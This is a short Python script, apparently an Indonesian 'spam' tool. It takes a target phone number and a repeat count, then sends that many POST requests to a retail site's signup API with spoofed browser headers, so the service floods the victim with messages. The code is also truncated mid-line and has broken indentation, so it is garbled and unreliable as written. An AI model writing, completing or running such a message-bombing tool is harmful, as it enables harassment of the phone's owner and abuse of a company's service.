01.15 20.47
Alvi18

import json
import requests
import os
import sys


def main():
        os.system('clear')
        os.system('figlet alvidinata')
        banner='''

        [+]AUTHOR:alvi dinata
        [+]Youtube : alvi dinata
        '''
        print(banner)
        no = input(' target : ')
        jum = input('Jumlah spam : ')


        head = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) Appl>
        "Referer": "https://www.mapclub.com/en/user/signup",
        "Host": "cmsapi.mapclub.com",
        }


        dat = {
        'phone': no
        }
for x in range (int(jum)):
                leosureo = requests.post("https://cmsapi.mapclub.com/>
                if 'eror' in leosureo:
                        print('gagal Mengirim ' + no)

                else:
                        print('succes mengirim ' + no)



main()
